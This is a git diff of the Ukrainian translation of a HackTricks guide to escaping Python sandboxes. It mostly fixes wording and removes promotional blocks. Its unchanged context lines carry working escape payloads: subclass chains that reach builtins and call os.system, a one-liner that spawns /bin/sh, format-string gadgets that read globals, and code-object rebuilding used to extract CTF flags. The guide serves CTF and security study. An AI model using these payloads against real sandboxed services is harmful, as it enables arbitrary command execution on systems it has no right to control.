@@ -15,19 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-Це деякі трюки для обходу захисту пісочниці Python та виконання довільних команд.
+Це деякі трюки для обходу захисту пісочниць Python та виконання довільних команд.
 
 ## Бібліотеки виконання команд
 
-Перше, що вам потрібно знати, це чи можете ви безпосередньо виконувати код з якоюсь вже імпортованою бібліотекою, або чи можете ви імпортувати будь-яку з цих бібліотек:
+Перше, що вам потрібно знати, це чи можете ви безпосередньо виконувати код з якоїсь вже імпортованої бібліотеки, або чи можете ви імпортувати будь-яку з цих бібліотек:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -70,7 +62,7 @@ Python намагається **завантажити бібліотеки з �
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
-## Обхід пісочниці pickle за допомогою стандартно встановлених python пакетів
+## Обхід пісочниці pickle за допомогою стандартних встановлених пакетів python
 
 ### Стандартні пакети
 
@@ -158,7 +150,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Обхід захисту через кодування (UTF-7)
+## Bypassing protections through encodings (UTF-7)
 
 У [**цьому звіті**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 використовується для завантаження та виконання довільного python коду всередині очевидного пісочниці:
 ```python
@@ -257,7 +249,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Створення об'єктів з [метакласами](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Ключова річ, яку дозволяють робити метакласи, це **створити екземпляр класу, не викликаючи конструктор** безпосередньо, створюючи новий клас з цільовим класом як метакласом.
+Ключова річ, яку дозволяють робити метакласи, це **створити екземпляр класу, не викликаючи конструктор** безпосередньо, створюючи новий клас з цільовим класом як метаклас.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -382,7 +374,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Нижче наведена більша функція**](./#recursive-search-of-builtins-globals) для знаходження десятків/**сотень** **місць**, де ви можете знайти **builtins**.
+[**Нижче наведена більша функція**](./#recursive-search-of-builtins-globals) для знаходження десятків/**сотень** **місць**, де ви можете знайти **вбудовані**.
 
 #### Python2 та Python3
 ```python
@@ -467,11 +459,11 @@ defined_func.__class__.__base__.__subclasses__()
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Є багато, і **нам потрібен лише один**, щоб виконати команди:
+Є багато, і **нам потрібен лише один** для виконання команд:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-Ми можемо зробити те ж саме з **іншими бібліотеками**, які, як ми знаємо, можуть бути використані для **виконання команд**:
+Ми можемо зробити те ж саме з **іншими бібліотеками**, які ми знаємо, що можуть бути використані для **виконання команд**:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -678,13 +670,13 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-You can check the output of this script on this page:
+Ви можете перевірити вихід цього скрипта на цій сторінці:
 
 {% content-ref url="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
 {% endcontent-ref %}
 
-## Python Format String
+## Python Форматний рядок
 
 Якщо ви **надсилаєте** **рядок** до python, який буде **форматуватися**, ви можете використовувати `{}` для доступу до **внутрішньої інформації python.** Ви можете використовувати попередні приклади для доступу до глобальних або вбудованих функцій, наприклад.
 
@@ -734,7 +726,7 @@ return 'HAL 9000'
 **Більше прикладів** про **формат** **рядків** можна знайти на [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Перевірте також наступну сторінку на наявність гаджетів, які зможуть r**ead чутливу інформацію з внутрішніх об'єктів Python**:
+Перевірте також наступну сторінку на наявність гаджетів, які зможуть r**ead sensitive information from Python internal objects**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -752,13 +744,13 @@ return 'HAL 9000'
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
-## Дослідження об'єктів Python
+## Розбір об'єктів Python
 
 {% hint style="info" %}
 Якщо ви хочете **вивчити** **байт-код Python** детально, прочитайте цей **чудовий** пост на цю тему: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-В деяких CTF вам можуть надати назву **кастомної функції, де знаходиться прапор**, і вам потрібно переглянути **внутрішню структуру** **функції**, щоб витягти його.
+В деяких CTF вам можуть надати назву **кастомної функції, в якій знаходиться прапор**, і вам потрібно переглянути **внутрішню структуру** **функції**, щоб витягти його.
 
 Це функція для перевірки:
 ```python
@@ -903,7 +895,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Компіляція Python
+## Compiling Python
 
 Тепер уявімо, що якимось чином ви можете **вивантажити інформацію про функцію, яку ви не можете виконати**, але вам **потрібно** її **виконати**.\
 Як у наступному прикладі, ви **можете отримати доступ до об'єкта коду** цієї функції, але просто читаючи disassemble, ви **не знаєте, як обчислити прапор** (_уявіть більш складну функцію `calc_flag`_)
@@ -952,7 +944,7 @@ types.CodeType.__doc__
 ### Відтворення витоку функції
 
 {% hint style="warning" %}
-У наступному прикладі ми будемо брати всі дані, необхідні для відтворення функції, безпосередньо з об'єкта коду функції. У **реальному прикладі** всі **значення**, необхідні для виконання функції **`code_type`**, це те, що **вам потрібно буде витягти**.
+У наступному прикладі ми будемо брати всі дані, необхідні для відтворення функції, безпосередньо з об'єкта коду функції. У **реальному прикладі** всі **значення** для виконання функції **`code_type`** - це те, що **вам потрібно буде витягти**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -966,10 +958,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-In previous examples at the beginning of this post, you can see **як виконати будь-який python код, використовуючи функцію `compile`**. This is interesting because you can **виконати цілі скрипти** with loops and everything in a **one liner** (and we could do the same using **`exec`**).\
-Anyway, sometimes it could be useful to **створити** a **скомпільований об'єкт** in a local machine and execute it in the **CTF machine** (for example because we don't have the `compiled` function in the CTF).
+В попередніх прикладах на початку цього посту ви можете побачити **як виконати будь-який python код, використовуючи функцію `compile`**. Це цікаво, тому що ви можете **виконувати цілі скрипти** з циклами і всім іншим в **одному рядку** (і ми могли б зробити те ж саме, використовуючи **`exec`**).\
+У будь-якому випадку, іноді може бути корисно **створити** **скомпільований об'єкт** на локальному комп'ютері і виконати його на **CTF машині** (наприклад, тому що у нас немає функції `compiled` в CTF).
 
-For example, let's compile and execute manually a function that reads _./poc.py_:
+Наприклад, давайте скомпілюємо і виконаємо вручну функцію, яка читає _./poc.py_:
 ```python
 #Locally
 def read():
@@ -996,7 +988,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Якщо ви не можете отримати доступ до `eval` або `exec`, ви можете створити **правильну функцію**, але викликати її безпосередньо зазвичай не вдасться з повідомленням: _конструктор недоступний в обмеженому режимі_. Тому вам потрібна **функція, яка не знаходиться в обмеженому середовищі, щоб викликати цю функцію.**
+Якщо ви не можете отримати доступ до `eval` або `exec`, ви можете створити **правильну функцію**, але прямий виклик зазвичай завершиться невдачею з повідомленням: _конструктор недоступний у обмеженому режимі_. Тому вам потрібна **функція, яка не знаходиться в обмеженому середовищі, щоб викликати цю функцію.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1019,7 +1011,7 @@ f(42)
 ### Assert
 
 Python, виконуваний з оптимізаціями з параметром `-O`, видалить оператори assert та будь-який код, що залежить від значення **debug**.\
-Тому перевірки, такі як
+Отже, перевірки, такі як
 ```python
 def check_permission(super_user):
 try:
@@ -1039,11 +1031,6 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -1051,11 +1038,11 @@ print(f"\nNot a Super User!!!\n")
 
 <details>
 
-<summary>Підтримати HackTricks</summary>
+<summary>Підтримайте HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
 {% endhint %}
